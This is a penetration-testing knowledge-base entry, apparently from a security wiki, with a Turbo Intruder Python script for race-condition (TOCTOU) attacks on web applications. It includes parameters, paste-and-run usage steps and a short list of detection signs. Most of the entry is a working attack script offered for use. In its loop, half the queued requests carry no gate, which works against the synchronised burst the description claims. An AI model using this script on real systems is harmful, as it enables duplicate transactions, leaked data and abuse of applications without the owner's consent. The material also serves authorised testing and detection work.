---
id: 8b7a1a73-544f-472b-8fdf-9971ca598611
name: turbo-intruder-race-condition-attack-script
type: code
language: python
verified: true
created_at: '2023-04-06T03:56:31.880390+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Web
tags:
  - race-condition
  - turbo-intruder
  - web-exploitation
validated: true
---

# turbo-intruder-race-condition-attack-script

## Code

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                        concurrentConnections=30,
                        requestsPerConnection=30,
                        pipeline=False
                        )

    # Queue multiple requests with different parameters
    for i in range(30):
        engine.queue(target.req, i)
        engine.queue(target.req, target.baseInput, gate='race1')

    # Start the engine and open gate for race condition
    engine.start(timeout=5)
    engine.openGate('race1')
    engine.complete(timeout=60)


def handleResponse(req, interesting):
    # Add request to table
    table.add(req)
```

## Description

This Python script provides the core functions for a Turbo Intruder attack exploiting race conditions in web applications. The queueRequests function sets up and launches concurrent requests with a gate to synchronize the race, while handleResponse logs all responses for post-attack analysis. It is designed to be pasted directly into Turbo Intruder's script editor to automate TOCTOU (Time-of-Check to Time-of-Use) vulnerabilities.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| concurrentConnections | Number of parallel connections | 30 |
| requestsPerConnection | Requests per connection | 30 |
| pipeline | Enable HTTP pipelining (False for races) | False |
| timeout (start) | Initial engine timeout | 5 |
| gate | Synchronization gate name | 'race1' |
| timeout (complete) | Overall completion timeout | 60 |

## Usage

1. Capture a vulnerable request in Burp Suite and send to Turbo Intruder.
2. Paste queueRequests into the upper script pane and handleResponse into the lower pane.
3. Adjust parameters for the target (e.g., increase connections for slower servers).
4. Click Start Attack to execute. Review the results table for successful races, such as duplicate actions or leaked data.
This code is used in procedures like [[procedures/Exploit-Race-Condition-with-Turbo-Intruder]] for web penetration testing.

## Detection

- Web application logs showing bursts of identical requests from one IP.
- WAF alerts on high request rates or concurrent endpoint hits.
- Anomalous response patterns, like multiple successes for idempotent actions.
- Network monitoring for rapid HTTP traffic spikes to specific paths.

## Related

- [[procedures/Exploit-Race-Condition-with-Turbo-Intruder]]
- [[tools/Turbo-Intruder]]
